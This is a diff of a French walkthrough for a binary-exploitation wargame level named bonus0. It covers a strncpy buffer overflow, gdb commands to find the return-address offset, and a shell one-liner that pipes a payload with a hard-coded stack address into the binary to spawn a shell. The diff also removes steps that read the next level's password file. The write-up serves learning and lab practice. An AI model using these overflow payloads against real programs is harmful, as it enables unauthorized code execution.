@@ -45,7 +45,7 @@ void p(char *dest, char *prompt) {
     char buf[4104];
     read(0, buf, 4096);
     *strchr(buf, '\n') = '\0';
-    strncpy(dest, buf, 20);   // ⚠️ pas de \0 si input == 20 chars
+    strncpy(dest, buf, 20);   // pas de \0 si input == 20 chars
 }
 ```
 
@@ -119,13 +119,6 @@ On envoie un pattern reconnaissable pour identifier quels bytes atterrissent dan
 ```bash
 (python -c "print 'A'*20"; sleep 1; python -c "print 'BBBBCCCCDDDDEEEEFFFFGG'"; cat) | gdb -q ~/bonus0 -ex run -ex "info registers eip"
 ```
-
-> ⚠️ Le `sleep 1` est **indispensable**. `read()` lit jusqu'à 4096 octets d'un
-> coup : sans pause, le 1er `read()` avale les DEUX mots, et le 2e `read()`
-> tombe sur EOF → `strchr` renvoie NULL → crash dans `p()` (et non sur EIP).
-> Le `sleep` sépare les deux écritures pour que chaque `read()` ait son mot.
-> Le `cat` final garde stdin ouvert.
-
 Crash à `0x45444444` → bytes en mémoire (little-endian) : `44 44 44 45` = `D D D E`
 
 ```
@@ -191,7 +184,7 @@ gcc /tmp/getenv.c -o /tmp/getenv
 # → 0xbffff8a3   (EXEMPLE : chez toi ce sera une AUTRE valeur, prends la tienne)
 ```
 
-> ⚠️ L'adresse `0xbffff8a3` n'est qu'un exemple. Utilise la valeur que **ton**
+>  L'adresse `0xbffff8a3` n'est qu'un exemple. Utilise la valeur que **ton**
 > `/tmp/getenv` affiche, et écris-la en little-endian dans l'étape suivante.
 
 ### Étape 3 — Construire l'input
@@ -210,25 +203,8 @@ gcc /tmp/getenv.c -o /tmp/getenv
 ### Étape 4 — Lancer l'exploit
 
 ```bash
-(python -c "print 'A'*20"; sleep 1; python -c "print 'A'*9 + '\xa3\xf8\xff\xbf' + 'A'*7"; cat) | ~/bonus0
+(python -c "print 'A'*20"; sleep 1; python -c "print 'A'*9 + '\xa3\xf8\xff\xbf' + 'A'*7"; cat) | ./bonus0
 ```
 
 Le `sleep 1` sépare les deux `read()` (cf. section « Trouver l'offset »), et le
 `cat` final garde stdin ouvert pour que le shell puisse recevoir des commandes.
-
-```bash
-whoami          # → bonus1
-cat /home/user/bonus1/.pass
-```
-
----
-
-## Concepts à retenir
-
-| Concept | Explication |
-|---|---|
-| `strncpy` sans null | Si l'input fait exactement N chars, pas de `\0` → buffer suivant fusionné |
-| NOP sled | Zone de `\x90` avant le shellcode pour ne pas viser exactement |
-| Variable d'env | Façon propre de stocker un shellcode sans contrainte de taille |
-| Little-endian | Une adresse `0xbffff8a3` s'écrit `\xa3\xf8\xff\xbf` dans le payload |
-| `cat` dans le pipe | Garde stdin ouvert pour interagir avec le shell spawné |
